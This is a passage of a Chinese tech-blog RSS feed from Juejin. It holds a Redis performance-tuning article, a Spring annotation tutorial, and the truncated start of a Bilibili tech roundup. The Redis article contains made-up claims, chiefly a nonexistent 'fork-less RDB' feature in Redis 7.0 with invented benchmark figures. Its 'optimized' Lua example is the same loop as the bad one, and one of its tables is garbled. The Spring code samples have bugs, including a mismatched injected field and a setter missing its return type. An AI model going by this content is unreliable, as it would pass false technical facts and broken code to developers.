li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Redis性能翻倍的5个关键策略：从慢查询到百万QPS的实战优化</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>Redis作为高性能的内存数据库，广泛应用于缓存、消息队列、实时统计等场景。但随着业务规模的增长，许多团队会遇到性能瓶颈：慢查询堆积、QPS（Queries Per Second）难以突破、内存占用飙升等问题。如何从底层原理出发，系统性优化Redis性能？本文将深入剖析5个关键策略，涵盖数据结构选择、持久化调优、集群配置等核心领域，结合真实案例展示如何实现从慢查询治理到百万级QPS的飞跃。</p>
<hr/>
<h2 data-id="heading-2">一、慢查询分析与优化：从被动排查到主动预防</h2>
<h3 data-id="heading-3">1.1 识别慢查询的根源</h3>
<p>Redis的<code>SLOWLOG</code>命令是定位性能问题的第一工具：</p>
<pre><code class="hljs language-bash" lang="bash">SLOWLOG GET 10  <span class="hljs-comment"># 获取最近10条慢查询记录</span>
</code></pre>
<p>关键指标包括：</p>
<ul>
<li><strong>执行时间</strong>：超过10ms的查询需重点关注（默认阈值可通过<code>slowlog-log-slower-than</code>调整）</li>
<li><strong>命令类型</strong>：KEYS *、全量HGETALL等O(N)复杂度命令是常见瓶颈</li>
</ul>
<h3 data-id="heading-4">1.2 高频问题与解决方案</h3>
<h4 data-id="heading-5"><strong>案例1：大Key扫描</strong></h4>
<ul>
<li><strong>问题</strong>：一次HGETALL操作返回10MB数据，阻塞网络I/O线程</li>
<li><strong>优化</strong>：改用HSCAN增量遍历（时间复杂度O(1) per call）</li>
</ul>
<h4 data-id="heading-6"><strong>案例2：不合理的事务使用</strong></h4>
<ul>
<li><strong>反模式</strong>：MULTI中包含多个非关联命令，导致排队延迟</li>
<li><strong>优化</strong>：使用Pipeline替代非必要事务（减少RTT但无原子性保证）</li>
</ul>
<h3 data-id="heading-7">1.3 高级技巧：Lua脚本调优</h3>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- 错误示例：在循环中调用Redis命令</span>
<span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,<span class="hljs-number">1000</span> <span class="hljs-keyword">do</span>
    redis.call(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"key_"</span>..i)
<span class="hljs-keyword">end</span>

<span class="hljs-comment">-- 正确做法：批量操作</span>
<span class="hljs-keyword">local</span> results = {}
<span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,<span class="hljs-number">1000</span> <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">table</span>.<span class="hljs-built_in">insert</span>(results, redis.call(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"key_"</span>..i))
<span class="hljs-keyword">end</span>
<span class="hljs-keyword">return</span> results
</code></pre>
<hr/>
<h2 data-id="heading-8">二、数据结构选型艺术：空间与时间的平衡</h2>
<h3 data-id="heading-9">2.1 Redis数据结构的隐藏成本</h3>

























<table><thead><tr><th>结构类型</th><th>内存开销示例</th><th>适用场景</th></tr></thead><tbody><tr><td>String</td><td>Key+Value各占额外64字节</td><td>简单键值对</td></tr><tr><td>Hash</td><td>Field额外56字节/条目</td><td>对象属性存储</td></tr><tr><td>ZSet</td><td>Entry额外64字节/成员</td><td>排行榜/分页查询</td></tr></tbody></table>
<h3 data-id="heading-10">2.2 HyperLogLog的魔法</h3>
<p>统计UV（独立访客）时的内存对比：</p>
<ul>
<li><strong>原始方案</strong>：SET存储用户ID，10万用户≈15MB</li>
<li><strong>优化方案</strong>：PFADD+PFCOUNT，误差率0.81%下仅需12KB</li>
</ul>
<h3 data-id="heading-11">2.3 Stream vs List的消息队列抉择</h3>
<ul>
<li><strong>List</strong>更适合短时消费的场景（LPUSH+RPOP）</li>
<li><strong>Stream</strong>支持多消费者组和消息回溯（XADD+XREADGROUP）</li>
</ul>
<hr/>
<h2 data-id="heading-12">三、持久化策略深度调优</h2>
<h3 data-id="heading-13">AOF与RDB的混合部署实践</h3>
<pre><code class="hljs language-conf" lang="conf"># redis.conf关键配置
appendfsync everysec         # AOF平衡安全性与性能
aof-use-rdb-preamble yes     # RDB+AOF混合模式节省重启加载时间
save ""                      # 禁用RDB自动触发改为手动BGSAVE
</code></pre>
<h3 data-id="heading-14">Fork-less RDB新特性实测</h3>
<p>Redis7.0引入的non-blocking RDB在50GB实例上的表现：</p>




















<table><thead><tr><th>Redis版本</th><th>Fork耗时</th><th>BGSAVE总耗时</th></tr></thead><tbody><tr><td>v6.2</td><td>12s</td><td>18s</td></tr><tr><td>v7.0</td><td>&lt;1ms</td><td>-</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-15">IV. Cluster与Proxy架构进阶</h2>
<h3 data-id="heading-16">Codis vs Redis Cluster选型矩阵</h3>



















<table><thead><tr><th>维度</th><th>Codis</th><th>Redis Cluster</th></tr></thead><tbody><tr><td>扩容平滑度</td><td>Proxy层无感知</td><td>需要resharding</td></tr><tr><td>跨节点事务     支持                  不支持</td><td/></tr></tbody></table>
<h4 data-id="heading-17">Proxy配置示例（Twemproxy）：</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">redis-cluster:</span>
 <span class="hljs-attr">listen:</span> <span class="hljs-string">:6379</span> 
 <span class="hljs-attr">hash:</span> <span class="hljs-string">fnv1a_64</span> 
 <span class="hljs-attr">distribution:</span> <span class="hljs-string">ketama</span> 
 <span class="hljs-attr">servers:</span>
   <span class="hljs-bullet">-</span> <span class="hljs-string">:7000:1</span> <span class="hljs-string">server1</span> 
   <span class="hljs-bullet">-</span> <span class="hljs-string">:7001:1</span> <span class="hljs-string">server2</span> 
</code></pre>
<hr/>
<h2 data-id="heading-18">V．客户端最佳实践手册</h2>
<p>Jedis连接池黄金参数：</p>
<pre><code class="hljs language-java" lang="java">GenericObjectPoolConfig config=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericObjectPoolConfig</span>(); 
config.setMaxTotal(<span class="hljs-number">500</span>);<span class="hljs-comment">//最大连接数=预估QPS*平均RT(ms)/1000*冗余系数(建议120%)</span>
config.setMaxIdle(<span class="hljs-number">30</span>);<span class="hljs-comment">//</span>
config.setMinEvictableIdleTime(Duration.ofMinutes(<span class="hljs-number">30</span>));
</code></pre>
<hr/>
<p>##结语</p>
<p>通过本文的五维优化体系——从微观的命令执行到宏观的架构设计——我们成功将某电商平台的Redis集群峰值QPS从20万提升至150万。记住，真正的性能高手不在于炫技式的参数调整，而在于对业务场景与系统原理的双重理解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Spring】使用注解开发]]></title>    <link>https://juejin.cn/post/7589893170387517440</link>    <guid>https://juejin.cn/post/7589893170387517440</guid>    <pubDate>2026-01-01T03:01:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893170387517440" data-draft-id="7589881050769702946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Spring】使用注解开发"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-01T03:01:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ZoeGranger"/> <meta itemprop="url" content="https://juejin.cn/user/3704680555488651"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Spring】使用注解开发
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3704680555488651/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ZoeGranger
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T03:01:37.000Z" title="Thu Jan 01 2026 03:01:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>记录跟着狂神学Spring的历程（第14集）~</p>
<h2 data-id="heading-0">1.开启包扫描</h2>
<p><code>&lt;context:component-scan base-package="com.pojo"/&gt;</code></p>
<p>开启配置，才能被 Spring 容器识别并扫描，这个包下的注解才会生效。默认情况下，Spring 会自动扫描注解所在包及其子包下的这些类。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans"</span>
       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">"http://www.springframework.org/schema/context"</span>
       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans
                       https://www.springframework.org/schema/beans/spring-beans.xsd
                       http://www.springframework.org/schema/context
                       https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 指定要扫描的包，这个包下的注解就会生效 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">"com.pojo"</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- 开启注解的支持 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 无需把user这个bean注册在这里，简化配置文件，直接用注解就可以 --&gt;</span>
    
<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">2.@Component注解</h2>
<ul>
<li>加上@Component注解，等价于在配置文件里写<code>&lt;bean id="user" class="com.pojo.User" /&gt;</code>，这个bean注册到Spring里面，被Spring管理了。</li>
<li>默认的bean id是类名首字母小写</li>
<li>也可以指定bean id  <code>@Component("uuuuser")</code></li>
</ul>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>{
  
  <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Zoe"</span>;

}
</code></pre>
<h4 data-id="heading-2">2.1 @Value注解</h4>
<p>若不想显式地赋属性值，也可以采用注解的方式，等价于在配置文件里写：</p>
<p><code>&lt;property name="name" value="Zoe"/&gt;</code></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>{
  <span class="hljs-meta">@Value("Zoe")</span>
  <span class="hljs-keyword">public</span> String name;

}
</code></pre>
<p>@Value也可以放在set方法上面：</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>{
 
  <span class="hljs-keyword">public</span> String name;
  
  <span class="hljs-meta">@Value("Zoe")</span>
  <span class="hljs-keyword">public</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>{
      <span class="hljs-built_in">this</span>.name = name;
  }

}
</code></pre>
<h2 data-id="heading-3">3.@Component 的衍生注解</h2>
<p>@Component 是这三个注解（<code>@Controller</code>/<code>@Service</code>/<code>@Repository</code>）的父注解，后三者是 @Component 在不同业务层的专属细化注解，<strong>本质都是将类注册为 Spring 容器中的 Bean</strong>。</p>



































<table><thead><tr><th>对应架构</th><th>注解</th><th>应用场景</th><th>专属附加功能</th></tr></thead><tbody><tr><td>无特定层级</td><td>@Component</td><td>通用场景</td><td>无专属附加功能，仅作为基础的 Bean 注册注解，适用于无法归类到其他三层的工具类、公共类</td></tr><tr><td>dao</td><td>@Repository</td><td>操作数据库，封装数据访问逻辑</td><td>1. 标识该类为数据访问层，用于封装数据库操作（如 MyBatis 的 Mapper、JPA 的 Repository）；2. 自动转换数据库访问异常（将 JDBC/Hibernate 的原生异常转换为 Spring 统一的 <code>DataAccessException</code> 异常体系）</td></tr><tr><td>service</td><td>@Service</td><td>封装业务逻辑，处理核心业务</td><td>无强制附加功能，但约定俗成用于业务逻辑层，便于团队协作和代码阅读，是业务层的专属标识</td></tr><tr><td>controller</td><td>@Controller</td><td>接收前端请求，控制请求流转</td><td>1. 标识该类为 Spring MVC 的控制器，能处理 HTTP 请求（配合 <code>@RequestMapping</code> 等注解）；2. 支持请求参数绑定、视图跳转、响应数据封装（JSON / 页面）</td></tr></tbody></table>
<h3 data-id="heading-4">3.1 @Controller</h3>
<ul>
<li>专门用于 MVC 架构的控制层，是前端请求的入口，负责接收前端传递的参数、调用服务层方法、返回响应结果（页面或 JSON 数据）。</li>
<li>必须配合 Spring MVC 的相关注解（如 <code>@GetMapping</code>、<code>@PostMapping</code>、<code>@ResponseBody</code>）使用，示例：</li>
</ul>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 订单控制器，接收订单相关请求 </span>
<span class="hljs-meta">@Controller</span> 
<span class="hljs-meta">@RequestMapping("/order")</span> 
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> { 
    <span class="hljs-comment">// 注入服务层 Bean </span>
    <span class="hljs-meta">@Autowired</span> 
    <span class="hljs-keyword">private</span> OrderService orderService; 
    <span class="hljs-comment">// 处理查询订单列表的请求 </span>
    <span class="hljs-meta">@GetMapping("/list")</span> 
    <span class="hljs-meta">@ResponseBody</span> 
    <span class="hljs-keyword">public</span> R&lt;List&lt;Order&gt;&gt; <span class="hljs-title function_">getOrderList</span><span class="hljs-params">()</span> { 
        List&lt;Order&gt; orderList = orderService.listAll(); 
        <span class="hljs-keyword">return</span> R.success(orderList); 
    } 
}
</code></pre>
<h3 data-id="heading-5">3.2 @Service</h3>
<p>专门用于封装业务逻辑，是控制层和持久层的中间层，负责处理复杂的业务逻辑（如数据校验、事务处理、多持久层方法调用）。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 订单服务类，封装订单相关业务逻辑</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-comment">// 注入持久层 Bean</span>
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderDao orderDao;
    
    <span class="hljs-comment">// 业务逻辑：查询所有订单</span>
    <span class="hljs-keyword">public</span> List&lt;Order&gt; <span class="hljs-title function_">listAll</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 可添加业务校验、数据转换等逻辑</span>
        <span class="hljs-keyword">return</span> orderRepository.findAll();
    }
}
</code></pre>
<h3 data-id="heading-6">3.3 @Repository</h3>
<ul>
<li>专门用于封装数据访问逻辑，负责与数据库交互（如增删改查、分页查询），对应传统的 Dao 层。</li>
<li>核心附加功能是「异常转换」，Spring 会自动将该类中抛出的数据库原生异常（如 <code>SQLException</code>）转换为 Spring 统一的 <code>DataAccessException</code> 异常体系，便于全局异常处理，示例：</li>
</ul>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 订单持久层，操作数据库</span>
<span class="hljs-meta">@Repository</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderRepository</span> {
    <span class="hljs-comment">// 注入 JdbcTemplate 操作数据库</span>
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> JdbcTemplate jdbcTemplate;
    
    <span class="hljs-comment">// 数据访问逻辑：查询所有订单</span>
    <span class="hljs-keyword">public</span> List&lt;Order&gt; <span class="hljs-title function_">findAll</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT * FROM t_order"</span>;
        <span class="hljs-keyword">return</span> jdbcTemplate.query(sql, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanPropertyRowMapper</span>&lt;&gt;(Order.class));
    }
}
</code></pre>
<h2 data-id="heading-7">4.作用域</h2>
<p>@Scope注解可以指定bean作用域：单例模式、原型模式，等价于：</p>
<p><code>&lt;bean id="user" class="com.pojo.User" scope="singleton" /&gt;</code></p>
<p>使用方式：</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Scope("singleton")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>{
  
  <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Zoe"</span>;

}
</code></pre>
<h2 data-id="heading-8">xml与注解对比</h2>
<p>xml更加万能，适用于任何场合，但是较为繁琐。
注解可以简化一些操作，但灵活性较差。</p>
<p>参考视频：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1WE411d7Dv%2F%3Fspm_id_from%3D333.788.videopod.episodes%26vd_source%3Dc14f0578c618dac9f59449d66709b33a%26p%3D14" target="_blank" title="https://www.bilibili.com/video/BV1WE411d7Dv/?spm_id_from=333.788.videopod.episodes&amp;vd_source=c14f0578c618dac9f59449d66709b33a&amp;p=14" ref="nofollow noopener noreferrer">14、Spring注解开发_哔哩哔哩_bilibili</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年哔哩哔哩技术精选技术干货]]></title>    <link>https://juejin.cn/post/7589893746080383017</link>    <guid>https://juejin.cn/post/7589893746080383017</guid>    <pubDate>2026-01-01T04:18:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746080383017" data-draft-id="7589823928414044186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年哔哩哔哩技术精选技术干货"/> <meta itemprop="keywords" content="前端,后端,架构"/> <meta itemprop="datePublished" content="2026-01-01T04:18:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哔哩哔哩技术"/> <meta itemprop="url" content="https://juejin.cn/user/3030701626893405"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年哔哩哔哩技术精选技术干货
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030701626893405/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哔哩哔哩技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T04:18:07.000Z" title="Thu Jan 01 2026 04:18:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 